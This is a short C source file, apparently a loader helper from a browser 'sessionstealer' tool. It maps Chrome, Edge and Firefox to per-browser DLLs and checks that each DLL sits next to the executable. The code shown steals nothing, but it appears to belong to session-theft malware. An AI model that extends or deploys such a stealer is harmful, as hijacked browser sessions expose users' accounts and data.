#include "sessionstealer/dll_loader.h"
#include "dlls/discovery/discovery.h"

#include <windows.h>
#include <stdio.h>

const char *browser_map_dll[] = {
    [DISCOVERY_CHROME]  = "chromium_browser.dll",
    [DISCOVERY_EDGE]    = "chromium_browser.dll",
    [DISCOVERY_FIREFOX] = "firefox_browser.dll"
};

const char *find_dll_browser(discovery_browser_name_t browser) {
    if (browser < 0 || browser >= DISCOVERY_BROWSER_COUNT)
        return NULL;

    const char *dll_name = browser_map_dll[browser];

    char exe_dir[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exe_dir, MAX_PATH)) {
        printf("Failed to get EXE path\n");
        return NULL;
    }

    char *last_backslash = strrchr(exe_dir, '\\');
    if (last_backslash) *last_backslash = '\0';

    char full_path[MAX_PATH];
    snprintf(full_path, MAX_PATH, "%s\\%s", exe_dir, dll_name);

    DWORD attrs = GetFileAttributesA(full_path);
    if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY))
        return NULL;

    return dll_name;
}
